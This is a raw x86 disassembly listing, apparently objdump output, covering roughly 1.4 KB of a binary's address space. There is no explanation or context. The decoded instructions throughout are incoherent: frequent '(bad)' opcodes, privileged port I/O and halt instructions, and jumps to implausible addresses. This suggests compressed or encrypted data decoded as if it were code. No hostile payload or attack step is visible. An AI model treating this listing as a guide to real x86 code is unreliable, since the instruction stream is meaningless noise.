  430b96:	2b 70 f6             	sub    -0xa(%eax),%esi
  430b99:	7d f6                	jge    0x430b91
  430b9b:	44                   	inc    %esp
  430b9c:	b3 87                	mov    $0x87,%bl
  430b9e:	b1 ab                	mov    $0xab,%cl
  430ba0:	92                   	xchg   %eax,%edx
  430ba1:	b0 80                	mov    $0x80,%al
  430ba3:	16                   	push   %ss
  430ba4:	81 f9 3b 8c 9b ed    	cmp    $0xed9b8c3b,%ecx
  430baa:	f8                   	clc
  430bab:	6c                   	insb   (%dx),%es:(%edi)
  430bac:	46                   	inc    %esi
  430bad:	8c a7 7b 71 be 3e    	mov    %fs,0x3ebe717b(%edi)
  430bb3:	7c a2                	jl     0x430b57
  430bb5:	b9 04 f3 92 93       	mov    $0x9392f304,%ecx
  430bba:	92                   	xchg   %eax,%edx
  430bbb:	f6 60 ec             	mulb   -0x14(%eax)
  430bbe:	73 ca                	jae    0x430b8a
  430bc0:	77 55                	ja     0x430c17
  430bc2:	29 59 ec             	sub    %ebx,-0x14(%ecx)
  430bc5:	f0 ae                	lock scas %es:(%edi),%al
  430bc7:	98                   	cwtl
  430bc8:	ee                   	out    %al,(%dx)
  430bc9:	fb                   	sti
  430bca:	1d 3b 52 2b df       	sbb    $0xdf2b523b,%eax
  430bcf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430bd0:	f6 ef                	imul   %bh
  430bd2:	10 17                	adc    %dl,(%edi)
  430bd4:	ed                   	in     (%dx),%eax
  430bd5:	24 8f                	and    $0x8f,%al
  430bd7:	6a 6b                	push   $0x6b
  430bd9:	10 31                	adc    %dh,(%ecx)
  430bdb:	e5 75                	in     $0x75,%eax
  430bdd:	fc                   	cld
  430bde:	4a                   	dec    %edx
  430bdf:	a1 24 b8 8f e8       	mov    0xe88fb824,%eax
  430be4:	e6 a7                	out    %al,$0xa7
  430be6:	b9 a0 6c 2e 28       	mov    $0x282e6ca0,%ecx
  430beb:	15 97 54 0c ba       	adc    $0xba0c5497,%eax
  430bf0:	be 1a d0 ce fe       	mov    $0xfeced01a,%esi
  430bf5:	e3 13                	jecxz  0x430c0a
  430bf7:	73 ed                	jae    0x430be6
  430bf9:	0e                   	push   %cs
  430bfa:	2b 14 dc             	sub    (%esp,%ebx,8),%edx
  430bfd:	2c 26                	sub    $0x26,%al
  430bff:	1d 78 40 5f e2       	sbb    $0xe25f4078,%eax
  430c04:	fc                   	cld
  430c05:	df b7 75 a8 1f 84    	fbstp  -0x7be0578b(%edi)
  430c0b:	82 5c d6 ea 75       	sbbb   $0x75,-0x16(%esi,%edx,8)
  430c10:	64 bb 0d 82 36 f3    	fs mov $0xf336820d,%ebx
  430c16:	c2 9f f2             	ret    $0xf29f
  430c19:	ab                   	stos   %eax,%es:(%edi)
  430c1a:	5e                   	pop    %esi
  430c1b:	12 ce                	adc    %dh,%cl
  430c1d:	72 92                	jb     0x430bb1
  430c1f:	93                   	xchg   %eax,%ebx
  430c20:	ea a6 89 d4 49 ea a1 	ljmp   $0xa1ea,$0x49d489a6
  430c27:	df 16                	fists  (%esi)
  430c29:	3c ca                	cmp    $0xca,%al
  430c2b:	ec                   	in     (%dx),%al
  430c2c:	7b e7                	jnp    0x430c15
  430c2e:	91                   	xchg   %eax,%ecx
  430c2f:	43                   	inc    %ebx
  430c30:	06                   	push   %es
  430c31:	d5 54                	aad    $0x54
  430c33:	36 04 96             	ss add $0x96,%al
  430c36:	cd 59                	int    $0x59
  430c38:	48                   	dec    %eax
  430c39:	e9 d9 f3 98 01       	jmp    0x1dc0017
  430c3e:	25 e2 e2 fd e3       	and    $0xe3fde2e2,%eax
  430c43:	ee                   	out    %al,(%dx)
  430c44:	75 27                	jne    0x430c6d
  430c46:	2d 77 eb f5 cf       	sub    $0xcff5eb77,%eax
  430c4b:	92                   	xchg   %eax,%edx
  430c4c:	fa                   	cli
  430c4d:	89 75 55             	mov    %esi,0x55(%ebp)
  430c50:	d3 1e                	rcrl   %cl,(%esi)
  430c52:	06                   	push   %es
  430c53:	2f                   	das
  430c54:	6a 5b                	push   $0x5b
  430c56:	f4                   	hlt
  430c57:	95                   	xchg   %eax,%ebp
  430c58:	81 60 bf 40 8c 64 19 	andl   $0x19648c40,-0x41(%eax)
  430c5f:	76 b9                	jbe    0x430c1a
  430c61:	fb                   	sti
  430c62:	62 c1 1c 98 9e       	(bad)
  430c67:	04 31                	add    $0x31,%al
  430c69:	2a b5 68 d0 75 45    	sub    0x4575d068(%ebp),%dh
  430c6f:	31 19                	xor    %ebx,(%ecx)
  430c71:	02 78 23             	add    0x23(%eax),%bh
  430c74:	7b b4                	jnp    0x430c2a
  430c76:	70 c6                	jo     0x430c3e
  430c78:	46                   	inc    %esi
  430c79:	c4 2a                	les    (%edx),%ebp
  430c7b:	ba f2 99 07 f6       	mov    $0xf60799f2,%edx
  430c80:	3a 99 7f 7e 4e 85    	cmp    -0x7ab18181(%ecx),%bl
  430c86:	b7 35                	mov    $0x35,%bh
  430c88:	53                   	push   %ebx
  430c89:	e0 7b                	loopne 0x430d06
  430c8b:	ae                   	scas   %es:(%edi),%al
  430c8c:	7a 3b                	jp     0x430cc9
  430c8e:	d6                   	salc
  430c8f:	62 e3 e7 94 3b       	(bad)
  430c94:	e0 58                	loopne 0x430cee
  430c96:	b5 da                	mov    $0xda,%ch
  430c98:	66 d4 ba             	data16 aam $0xba
  430c9b:	59                   	pop    %ecx
  430c9c:	42                   	inc    %edx
  430c9d:	b3 77                	mov    $0x77,%bl
  430c9f:	30 9d a9 7c 82 f3    	xor    %bl,-0xc7d8357(%ebp)
  430ca5:	cc                   	int3
  430ca6:	b0 7a                	mov    $0x7a,%al
  430ca8:	f4                   	hlt
  430ca9:	5d                   	pop    %ebp
  430caa:	bc 6f c8 bb 8c       	mov    $0x8cbbc86f,%esp
  430caf:	dc 3d 1a 45 0b 82    	fdivrl 0x820b451a
  430cb5:	dc ae 53 e9 51 57    	fsubrl 0x5751e953(%esi)
  430cbb:	fb                   	sti
  430cbc:	10 8f 41 28 76 91    	adc    %cl,-0x6e89d7bf(%edi)
  430cc2:	26 6a a1             	es push $0xffffffa1
  430cc5:	81 be 1a 5d 81 9c bc 	cmpl   $0x3b1b9cbc,-0x637ea2e6(%esi)
  430ccc:	9c 1b 3b 
  430ccf:	f8                   	clc
  430cd0:	07                   	pop    %es
  430cd1:	8c 0d 97 a8 4c 80    	mov    %cs,0x804ca897
  430cd7:	59                   	pop    %ecx
  430cd8:	d7                   	xlat   %ds:(%ebx)
  430cd9:	c1 6b 4d d7          	shrl   $0xd7,0x4d(%ebx)
  430cdd:	f6 59 ac             	negb   -0x54(%ecx)
  430ce0:	41                   	inc    %ecx
  430ce1:	1b b3 5d 43 4a 57    	sbb    0x574a435d(%ebx),%esi
  430ce7:	87 f4                	xchg   %esi,%esp
  430ce9:	de 03                	fiadds (%ebx)
  430ceb:	3f                   	aas
  430cec:	d9 fc                	frndint
  430cee:	f2 d0 1f             	repnz rcrb $1,(%edi)
  430cf1:	c8 4c 4c 29          	enter  $0x4c4c,$0x29
  430cf5:	12 ab f4 1a f6 69    	adc    0x69f61af4(%ebx),%ch
  430cfb:	6a 93                	push   $0xffffff93
  430cfd:	f3 65 8b 24 eb       	repz mov %gs:(%ebx,%ebp,8),%esp
  430d02:	c9                   	leave
  430d03:	42                   	inc    %edx
  430d04:	58                   	pop    %eax
  430d05:	b6 68                	mov    $0x68,%dh
  430d07:	c7                   	(bad)
  430d08:	cb                   	lret
  430d09:	48                   	dec    %eax
  430d0a:	c7                   	(bad)
  430d0b:	b3 c7                	mov    $0xc7,%bl
  430d0d:	18 8c 3f d6 4f 6c 2a 	sbb    %cl,0x2a6c4fd6(%edi,%edi,1)
  430d14:	b3 11                	mov    $0x11,%bl
  430d16:	5e                   	pop    %esi
  430d17:	d8 97 58 ca 93 60    	fcoms  0x6093ca58(%edi)
  430d1d:	ac                   	lods   %ds:(%esi),%al
  430d1e:	f6 97 3d ad d6 54    	notb   0x54d6ad3d(%edi)
  430d24:	2a 05 0a 67 7c e7    	sub    0xe77c670a,%al
  430d2a:	79 f4                	jns    0x430d20
  430d2c:	75 41                	jne    0x430d6f
  430d2e:	24 ce                	and    $0xce,%al
  430d30:	b3 3f                	mov    $0x3f,%bl
  430d32:	e2 d7                	loop   0x430d0b
  430d34:	23 4a 32             	and    0x32(%edx),%ecx
  430d37:	72 08                	jb     0x430d41
  430d39:	8a bf 30 f1 9d 62    	mov    0x629df130(%edi),%bh
  430d3f:	52                   	push   %edx
  430d40:	f4                   	hlt
  430d41:	7b 2a                	jnp    0x430d6d
  430d43:	71 ef                	jno    0x430d34
  430d45:	ec                   	in     (%dx),%al
  430d46:	a0 7e a9 a6 62       	mov    0x62a6a97e,%al
  430d4b:	ab                   	stos   %eax,%es:(%edi)
  430d4c:	90                   	nop
  430d4d:	7f 0e                	jg     0x430d5d
  430d4f:	5d                   	pop    %ebp
  430d50:	b1 3f                	mov    $0x3f,%cl
  430d52:	6e                   	outsb  %ds:(%esi),(%dx)
  430d53:	0b 6f 6e             	or     0x6e(%edi),%ebp
  430d56:	ae                   	scas   %es:(%edi),%al
  430d57:	06                   	push   %es
  430d58:	54                   	push   %esp
  430d59:	04 2d                	add    $0x2d,%al
  430d5b:	51                   	push   %ecx
  430d5c:	04 8e                	add    $0x8e,%al
  430d5e:	46                   	inc    %esi
  430d5f:	37                   	aaa
  430d60:	31 0f                	xor    %ecx,(%edi)
  430d62:	3d b9 9c 12 b0       	cmp    $0xb0129cb9,%eax
  430d67:	53                   	push   %ebx
  430d68:	34 3c                	xor    $0x3c,%al
  430d6a:	f0 67 8c 38          	lock mov %?,(%bx,%si)
  430d6e:	ce                   	into
  430d6f:	cc                   	int3
  430d70:	99                   	cltd
  430d71:	f6 70 42             	divb   0x42(%eax)
  430d74:	d7                   	xlat   %ds:(%ebx)
  430d75:	26 dc 0a             	fmull  %es:(%edx)
  430d78:	97                   	xchg   %eax,%edi
  430d79:	c3                   	ret
  430d7a:	ef                   	out    %eax,(%dx)
  430d7b:	c5 31                	lds    (%ecx),%esi
  430d7d:	2d 6c 32 d3 1d       	sub    $0x1dd3326c,%eax
  430d82:	d3 19                	rcrl   %cl,(%ecx)
  430d84:	96                   	xchg   %eax,%esi
  430d85:	74 96                	je     0x430d1d
  430d87:	8d a3 33 e2 76 9b    	lea    -0x64891dcd(%ebx),%esp
  430d8d:	0b 87 29 39 5d 6d    	or     0x6d5d3929(%edi),%eax
  430d93:	73 a4                	jae    0x430d39
  430d95:	b5 05                	mov    $0x5,%ch
  430d97:	ff 9b 84 46 dd 2f    	lcall  *0x2fdd4684(%ebx)
  430d9d:	4c                   	dec    %esp
  430d9e:	d2 cd                	ror    %cl,%ch
  430da0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430da1:	05 9b 3e 13 28       	add    $0x28133e9b,%eax
  430da6:	1a ad eb 08 fa ac    	sbb    -0x5305f715(%ebp),%ch
  430dac:	e1 cf                	loope  0x430d7d
  430dae:	3d fe 3c 6d 60       	cmp    $0x606d3cfe,%eax
  430db3:	c0 91 d7 63 76 cc 58 	rclb   $0x58,-0x33899c29(%ecx)
  430dba:	29 e8                	sub    %ebp,%eax
  430dbc:	94                   	xchg   %eax,%esp
  430dbd:	0d a2 83 a9 e7       	or     $0xe7a983a2,%eax
  430dc2:	b3 b5                	mov    $0xb5,%bl
  430dc4:	69 0a d9 ad 06 d4    	imul   $0xd406add9,(%edx),%ecx
  430dca:	fc                   	cld
  430dcb:	b5 04                	mov    $0x4,%ch
  430dcd:	fe                   	(bad)
  430dce:	e7 c7                	out    %eax,$0xc7
  430dd0:	45                   	inc    %ebp
  430dd1:	7d 93                	jge    0x430d66
  430dd3:	b2 98                	mov    $0x98,%dl
  430dd5:	50                   	push   %eax
  430dd6:	bb 2b 6c a4 0b       	mov    $0xba46c2b,%ebx
  430ddb:	60                   	pusha
  430ddc:	e1 72                	loope  0x430e50
  430dde:	cf                   	iret
  430ddf:	f1                   	int1
  430de0:	57                   	push   %edi
  430de1:	3a 60 dc             	cmp    -0x24(%eax),%ah
  430de4:	95                   	xchg   %eax,%ebp
  430de5:	80 de 57             	sbb    $0x57,%dh
  430de8:	55                   	push   %ebp
  430de9:	8c 60 39             	mov    %fs,0x39(%eax)
  430dec:	e5 8f                	in     $0x8f,%eax
  430dee:	df ab ed 4c d7 8a    	fildll -0x7528b313(%ebx)
  430df4:	d5 17                	aad    $0x17
  430df6:	e7 72                	out    %eax,$0x72
  430df8:	d3 6b f8             	shrl   %cl,-0x8(%ebx)
  430dfb:	51                   	push   %ecx
  430dfc:	f0 93                	lock xchg %eax,%ebx
  430dfe:	e7 2a                	out    %eax,$0x2a
  430e00:	8e 48 6d             	mov    0x6d(%eax),%cs
  430e03:	1b c1                	sbb    %ecx,%eax
  430e05:	2a 6c 0d 5e          	sub    0x5e(%ebp,%ecx,1),%ch
  430e09:	90                   	nop
  430e0a:	05 bc 79 5d 96       	add    $0x965d79bc,%eax
  430e0f:	b6 45                	mov    $0x45,%dh
  430e11:	e4 a3                	in     $0xa3,%al
  430e13:	cc                   	int3
  430e14:	e3 c5                	jecxz  0x430ddb
  430e16:	0f 61 6b 32          	punpcklwd 0x32(%ebx),%mm5
  430e1a:	31 69 20             	xor    %ebp,0x20(%ecx)
  430e1d:	e0 72                	loopne 0x430e91
  430e1f:	25 29 28 b9 ec       	and    $0xecb92829,%eax
  430e24:	7b 18                	jnp    0x430e3e
  430e26:	bc 88 d7 22 c8       	mov    $0xc822d788,%esp
  430e2b:	d6                   	salc
  430e2c:	36 dc 90 6b 35 ac f1 	fcoml  %ss:-0xe53ca95(%eax)
  430e33:	81 e4 60 81 77 51    	and    $0x51778160,%esp
  430e39:	a9 60 00 c8 ca       	test   $0xcac80060,%eax
  430e3e:	17                   	pop    %ss
  430e3f:	b2 27                	mov    $0x27,%dl
  430e41:	ac                   	lods   %ds:(%esi),%al
  430e42:	30 08                	xor    %cl,(%eax)
  430e44:	55                   	push   %ebp
  430e45:	cf                   	iret
  430e46:	42                   	inc    %edx
  430e47:	a0 34 06 42 43       	mov    0x43420634,%al
  430e4c:	fa                   	cli
  430e4d:	50                   	push   %eax
  430e4e:	5b                   	pop    %ebx
  430e4f:	74 63                	je     0x430eb4
  430e51:	0d 5e cd 16 45       	or     $0x4516cd5e,%eax
  430e56:	25 1a b1 4a 96       	and    $0x964ab11a,%eax
  430e5b:	18 aa dd dc ba c8    	sbb    %ch,-0x37452323(%edx)
  430e61:	f8                   	clc
  430e62:	c9                   	leave
  430e63:	30 90 ee 19 7a 0f    	xor    %dl,0xf7a19ee(%eax)
  430e69:	97                   	xchg   %eax,%edi
  430e6a:	d3 33                	shll   %cl,(%ebx)
  430e6c:	ac                   	lods   %ds:(%esi),%al
  430e6d:	23 fb                	and    %ebx,%edi
  430e6f:	94                   	xchg   %eax,%esp
  430e70:	5c                   	pop    %esp
  430e71:	74 46                	je     0x430eb9
  430e73:	d3 ee                	shr    %cl,%esi
  430e75:	27                   	daa
  430e76:	7d dc                	jge    0x430e54
  430e78:	1a 57 ea             	sbb    -0x16(%edi),%dl
  430e7b:	c5 e9 21             	(bad)
  430e7e:	38 dc                	cmp    %bl,%ah
  430e80:	a2 d3 91 a4 1c       	mov    %al,0x1ca491d3
  430e85:	fc                   	cld
  430e86:	b0 75                	mov    $0x75,%al
  430e88:	37                   	aaa
  430e89:	66 45                	inc    %bp
  430e8b:	a3 13 e0 e2 52       	mov    %eax,0x52e2e013
  430e90:	fc                   	cld
  430e91:	c9                   	leave
  430e92:	cf                   	iret
  430e93:	d8 ae 2f c7 a4 a7    	fsubrs -0x585b38d1(%esi)
  430e99:	00 f2                	add    %dh,%dl
  430e9b:	d4 fd                	aam    $0xfd
  430e9d:	e4 01                	in     $0x1,%al
  430e9f:	9b                   	fwait
  430ea0:	cc                   	int3
  430ea1:	40                   	inc    %eax
  430ea2:	e7 98                	out    %eax,$0x98
  430ea4:	3a a7 55 14 4f 33    	cmp    0x334f1455(%edi),%ah
  430eaa:	b4 f0                	mov    $0xf0,%ah
  430eac:	e8 c4 09 ba 7d       	call   0x7dfd1875
  430eb1:	c8 dd bc e8          	enter  $0xbcdd,$0xe8
  430eb5:	b7 03                	mov    $0x3,%bh
  430eb7:	0d 78 1b ce ef       	or     $0xefce1b78,%eax
  430ebc:	42                   	inc    %edx
  430ebd:	70 af                	jo     0x430e6e
  430ebf:	d1 c1                	rol    $1,%ecx
  430ec1:	24 0a                	and    $0xa,%al
  430ec3:	26 86 5f d0          	xchg   %bl,%es:-0x30(%edi)
  430ec7:	84 b9 89 d6 0e 7d    	test   %bh,0x7d0ed689(%ecx)
  430ecd:	09 f3                	or     %esi,%ebx
  430ecf:	64 86 fa             	fs xchg %bh,%dl
  430ed2:	53                   	push   %ebx
  430ed3:	27                   	daa
  430ed4:	06                   	push   %es
  430ed5:	6b 43 89 0c          	imul   $0xc,-0x77(%ebx),%eax
  430ed9:	c9                   	leave
  430eda:	4c                   	dec    %esp
  430edb:	8a 2b                	mov    (%ebx),%ch
  430edd:	18 5b 46             	sbb    %bl,0x46(%ebx)
  430ee0:	fe                   	(bad)
  430ee1:	38 f1                	cmp    %dh,%cl
  430ee3:	79 d9                	jns    0x430ebe
  430ee5:	b8 1c 4d 7d 34       	mov    $0x347d4d1c,%eax
  430eea:	b9 7a f1 c5 4a       	mov    $0x4ac5f17a,%ecx
  430eef:	ae                   	scas   %es:(%edi),%al
  430ef0:	fe                   	(bad)
  430ef1:	f2 98                	repnz cwtl
  430ef3:	69 c3 72 8e b0 aa    	imul   $0xaab08e72,%ebx,%eax
  430ef9:	f6 40 29 db          	testb  $0xdb,0x29(%eax)
  430efd:	d5 99                	aad    $0x99
  430eff:	b5 ec                	mov    $0xec,%ch
  430f01:	ff c6                	inc    %esi
  430f03:	31 65 a8             	xor    %esp,-0x58(%ebp)
  430f06:	4f                   	dec    %edi
  430f07:	59                   	pop    %ecx
  430f08:	c1 ca 9a             	ror    $0x9a,%edx
  430f0b:	58                   	pop    %eax
  430f0c:	51                   	push   %ecx
  430f0d:	bc ea e6 2e c9       	mov    $0xc92ee6ea,%esp
  430f12:	73 19                	jae    0x430f2d
  430f14:	7d f3                	jge    0x430f09
  430f16:	85 5a c8             	test   %ebx,-0x38(%edx)
  430f19:	24 f3                	and    $0xf3,%al
  430f1b:	d3 9a df 44 a6 fe    	rcrl   %cl,-0x159bb21(%edx)
  430f21:	96                   	xchg   %eax,%esi
  430f22:	67 1e                	addr16 push %ds
  430f24:	71 e9                	jno    0x430f0f
  430f26:	5e                   	pop    %esi
  430f27:	02 10                	add    (%eax),%dl
  430f29:	e2 3d                	loop   0x430f68
  430f2b:	7f 60                	jg     0x430f8d
  430f2d:	4a                   	dec    %edx
  430f2e:	aa                   	stos   %al,%es:(%edi)
  430f2f:	b2 07                	mov    $0x7,%dl
  430f31:	e0 a7                	loopne 0x430eda
  430f33:	73 0c                	jae    0x430f41
  430f35:	14 39                	adc    $0x39,%al
  430f37:	c0 40 00 24          	rolb   $0x24,0x0(%eax)
  430f3b:	c0 38 88             	sarb   $0x88,(%eax)
  430f3e:	28 9d f7 7e 1a a5    	sub    %bl,-0x5ae58109(%ebp)
  430f44:	63 41 60             	arpl   %eax,0x60(%ecx)
  430f47:	c7                   	(bad)
  430f48:	f5                   	cmc
  430f49:	fe                   	(bad)
  430f4a:	95                   	xchg   %eax,%ebp
  430f4b:	4a                   	dec    %edx
  430f4c:	5e                   	pop    %esi
  430f4d:	05 25 75 44 3e       	add    $0x3e447525,%eax
  430f52:	9a 8d 0e 7b 04 1d 7a 	lcall  $0x7a1d,$0x47b0e8d
  430f59:	74 ee                	je     0x430f49
  430f5b:	39 c4                	cmp    %eax,%esp
  430f5d:	3e 6a 10             	ds push $0x10
  430f60:	5d                   	pop    %ebp
  430f61:	a1 67 e8 ca 26       	mov    0x26cae867,%eax
  430f66:	3e 9b                	ds fwait
  430f68:	3e 8e 58 8e          	mov    %ds:-0x72(%eax),%ds
  430f6c:	42                   	inc    %edx
  430f6d:	2d 1c 90 75 2e       	sub    $0x2e75901c,%eax
  430f72:	f0 6b 4d d3 1e       	lock imul $0x1e,-0x2d(%ebp),%ecx
  430f77:	1e                   	push   %ds
  430f78:	9b                   	fwait
  430f79:	1c a2                	sbb    $0xa2,%al
  430f7b:	64 c6                	fs (bad)
  430f7d:	ec                   	in     (%dx),%al
  430f7e:	f8                   	clc
  430f7f:	59                   	pop    %ecx
  430f80:	c2 04 5f             	ret    $0x5f04
  430f83:	cc                   	int3
  430f84:	87 ae cd a3 b0 35    	xchg   %ebp,0x35b0a3cd(%esi)
  430f8a:	9e                   	sahf
  430f8b:	79 59                	jns    0x430fe6
  430f8d:	7b 31                	jnp    0x430fc0
  430f8f:	3c 87                	cmp    $0x87,%al
  430f91:	53                   	push   %ebx
  430f92:	04 92                	add    $0x92,%al
  430f94:	19 a5 ab 8f e7 12    	sbb    %esp,0x12e78fab(%ebp)
  430f9a:	56                   	push   %esi
  430f9b:	5a                   	pop    %edx
  430f9c:	b2 f0                	mov    $0xf0,%dl
  430f9e:	31 f0                	xor    %esi,%eax
  430fa0:	d6                   	salc
  430fa1:	ba d3 41 b2 24       	mov    $0x24b241d3,%edx
  430fa6:	13 f9                	adc    %ecx,%edi
  430fa8:	17                   	pop    %ss
  430fa9:	61                   	popa
  430faa:	93                   	xchg   %eax,%ebx
  430fab:	49                   	dec    %ecx
  430fac:	b4 d3                	mov    $0xd3,%ah
  430fae:	f3 59                	repz pop %ecx
  430fb0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430fb1:	5e                   	pop    %esi
  430fb2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430fb3:	3b 89 a9 2a 11 b2    	cmp    -0x4deed557(%ecx),%ecx
  430fb9:	1f                   	pop    %ds
  430fba:	1f                   	pop    %ds
  430fbb:	cb                   	lret
  430fbc:	e9 5b 68 4c b8       	jmp    0xb88f781c
  430fc1:	15 21 13 b0 52       	adc    $0x52b01321,%eax
  430fc6:	06                   	push   %es
  430fc7:	af                   	scas   %es:(%edi),%eax
  430fc8:	96                   	xchg   %eax,%esi
  430fc9:	5e                   	pop    %esi
  430fca:	2b 02                	sub    (%edx),%eax
  430fcc:	24 76                	and    $0x76,%al
  430fce:	8b a3 c3 5a 6f 23    	mov    0x236f5ac3(%ebx),%esp
  430fd4:	5a                   	pop    %edx
  430fd5:	08 a0 4b 95 1d e4    	or     %ah,-0x1be26ab5(%eax)
  430fdb:	7c 67                	jl     0x431044
  430fdd:	56                   	push   %esi
  430fde:	67 c8 2a e1 d8       	addr16 enter $0xe12a,$0xd8
  430fe3:	aa                   	stos   %al,%es:(%edi)
  430fe4:	28 39                	sub    %bh,(%ecx)
  430fe6:	f4                   	hlt
  430fe7:	ae                   	scas   %es:(%edi),%al
  430fe8:	65 7b 88             	gs jnp 0x430f73
  430feb:	08 1a                	or     %bl,(%edx)
  430fed:	ee                   	out    %al,(%dx)
  430fee:	d0 10                	rclb   $1,(%eax)
  430ff0:	8c d9                	mov    %ds,%ecx
  430ff2:	46                   	inc    %esi
  430ff3:	81 68 f2 01 9e 9d 50 	subl   $0x509d9e01,-0xe(%eax)
  430ffa:	2e 5a                	cs pop %edx
  430ffc:	8c b0 92 72 81 2e    	mov    %?,0x2e817292(%eax)
  431002:	73 e1                	jae    0x430fe5
  431004:	74 f7                	je     0x430ffd
  431006:	27                   	daa
  431007:	b9 53 21 dc 47       	mov    $0x47dc2153,%ecx
  43100c:	7a 12                	jp     0x431020
  43100e:	f7 7c 7c 3e          	idivl  0x3e(%esp,%edi,2)
  431012:	31 3b                	xor    %edi,(%ebx)
  431014:	8a 3e                	mov    (%esi),%bh
  431016:	d2 e3                	shl    %cl,%bl
  431018:	c7 02 6f 9d 7d e7    	movl   $0xe77d9d6f,(%edx)
  43101e:	51                   	push   %ecx
  43101f:	37                   	aaa
  431020:	aa                   	stos   %al,%es:(%edi)
  431021:	5e                   	pop    %esi
  431022:	b9 fe 2e 25 fd       	mov    $0xfd252efe,%ecx
  431027:	d6                   	salc
  431028:	2a 2b                	sub    (%ebx),%ch
  43102a:	c0 f3 0e             	shl    $0xe,%bl
  43102d:	bf b7 0e 6b 12       	mov    $0x126b0eb7,%edi
  431032:	a3 fc 32 c2 1f       	mov    %eax,0x1fc232fc
  431037:	7e 78                	jle    0x4310b1
  431039:	8c 73 fa             	mov    %?,-0x6(%ebx)
  43103c:	3c a6                	cmp    $0xa6,%al
  43103e:	55                   	push   %ebp
  43103f:	ee                   	out    %al,(%dx)
  431040:	7c c3                	jl     0x431005
  431042:	82 bb 83 be a3 44 a5 	cmpb   $0xa5,0x44a3be83(%ebx)
  431049:	df 53 d3             	fists  -0x2d(%ebx)
  43104c:	16                   	push   %ss
  43104d:	ba 6c 8e 2e 2c       	mov    $0x2c2e8e6c,%edx
  431052:	6f                   	outsl  %ds:(%esi),(%dx)
  431053:	76 3a                	jbe    0x43108f
  431055:	b0 d9                	mov    $0xd9,%al
  431057:	e9 7d 22 ea df       	jmp    0xe02d32d9
  43105c:	86 61 d8             	xchg   %ah,-0x28(%ecx)
  43105f:	ff 05 70 ef 96 98    	incl   0x9896ef70
  431065:	af                   	scas   %es:(%edi),%eax
  431066:	bb 44 26 03 6e       	mov    $0x6e032644,%ebx
  43106b:	90                   	nop
  43106c:	5a                   	pop    %edx
  43106d:	76 e9                	jbe    0x431058
  43106f:	e8 c6 5b 9e 4b       	call   0x4be16c3a
  431074:	d9 63 be             	fldenv -0x42(%ebx)
  431077:	0a c2                	or     %dl,%al
  431079:	8f                   	(bad)
  43107a:	5e                   	pop    %esi
  43107b:	6f                   	outsl  %ds:(%esi),(%dx)
  43107c:	9b                   	fwait
  43107d:	03 98 9c c7 b8 dd    	add    -0x22473864(%eax),%ebx
  431083:	09 7b 86             	or     %edi,-0x7a(%ebx)
  431086:	e8 33 08 a4 cd       	call   0xcde718be
  43108b:	a0 fa f1 a0 8f       	mov    0x8fa0f1fa,%al
  431090:	2b 64 52 c2          	sub    -0x3e(%edx,%edx,2),%esp
  431094:	fd                   	std
  431095:	d5 d7                	aad    $0xd7
  431097:	5a                   	pop    %edx
  431098:	62                   	(bad)
  431099:	f4                   	hlt
  43109a:	97                   	xchg   %eax,%edi
  43109b:	b6 82                	mov    $0x82,%dh
  43109d:	55                   	push   %ebp
  43109e:	d6                   	salc
  43109f:	e6 0c                	out    %al,$0xc
  4310a1:	08 5f 44             	or     %bl,0x44(%edi)
  4310a4:	5f                   	pop    %edi
  4310a5:	43                   	inc    %ebx
  4310a6:	48                   	dec    %eax
  4310a7:	89 ef                	mov    %ebp,%edi
  4310a9:	5a                   	pop    %edx
  4310aa:	83 60 f5 e3          	andl   $0xffffffe3,-0xb(%eax)
  4310ae:	16                   	push   %ss
  4310af:	5d                   	pop    %ebp
  4310b0:	09 92 2c e2 61 98    	or     %edx,-0x679e1dd4(%edx)
  4310b6:	19 ca                	sbb    %ecx,%edx
  4310b8:	3d 01 cc c2 75       	cmp    $0x75c2cc01,%eax
  4310bd:	8e fe                	mov    %esi,%?
  4310bf:	8e 42 94             	mov    -0x6c(%edx),%es
  4310c2:	58                   	pop    %eax
  4310c3:	05 f9 7d 39 97       	add    $0x97397df9,%eax
  4310c8:	1d 35 13 b6 8d       	sbb    $0x8db61335,%eax
  4310cd:	4c                   	dec    %esp
  4310ce:	00 3f                	add    %bh,(%edi)
  4310d0:	30 d7                	xor    %dl,%bh
  4310d2:	79 7d                	jns    0x431151
  4310d4:	d2 b3 b0 ef a3 88    	shlb   %cl,-0x775c1050(%ebx)
  4310da:	13 0c 9f             	adc    (%edi,%ebx,4),%ecx
  4310dd:	52                   	push   %edx
  4310de:	e0 08                	loopne 0x4310e8
  4310e0:	c6                   	(bad)
  4310e1:	27                   	daa
  4310e2:	54                   	push   %esp
  4310e3:	ac                   	lods   %ds:(%esi),%al
  4310e4:	9b df 79 94          	fistpll -0x6c(%ecx)
  4310e8:	d6                   	salc
  4310e9:	4f                   	dec    %edi
  4310ea:	40                   	inc    %eax
  4310eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4310ec:	f6 98 17 d8 8a e7    	negb   -0x187527e9(%eax)
  4310f2:	22 56 c5             	and    -0x3b(%esi),%dl
  4310f5:	7d 27                	jge    0x43111e
  4310f7:	bb 82 e4 e9 7c       	mov    $0x7ce9e482,%ebx
  4310fc:	ec                   	in     (%dx),%al
  4310fd:	aa                   	stos   %al,%es:(%edi)
  4310fe:	a2 98 ae 03 ef       	mov    %al,0xef03ae98
  431103:	2e 44                	cs inc %esp
  431105:	d9 0e                	(bad) (%esi)
  431107:	fe                   	(bad)
  431108:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431109:	6f                   	outsl  %ds:(%esi),(%dx)
  43110a:	64 62 68 4c          	bound  %ebp,%fs:0x4c(%eax)
  43110e:	d8 93 04 b9 bb 09    	fcoms  0x9bbb904(%ebx)
  431114:	b0 88                	mov    $0x88,%al
  431116:	ce                   	into
  431117:	12 4f 8c             	adc    -0x74(%edi),%cl
  43111a:	a1 ab 9e 44 c1       	mov    0xc1449eab,%eax
  43111f:	c9                   	leave
  431120:	f2 7b 49             	bnd jnp 0x43116c
  431123:	6c                   	insb   (%dx),%es:(%edi)
  431124:	76 1a                	jbe    0x431140
  431126:	14 2e                	adc    $0x2e,%al
  431128:	29 9a 7a bc 78 1c    	sub    %ebx,0x1c78bc7a(%edx)
  43112e:	23 55 92             	and    -0x6e(%ebp),%edx
  431131:	24 81                	and    $0x81,%al
  431133:	59                   	pop    %ecx
  431134:	a9 a3 6d 33 75       	test   $0x75336da3,%eax
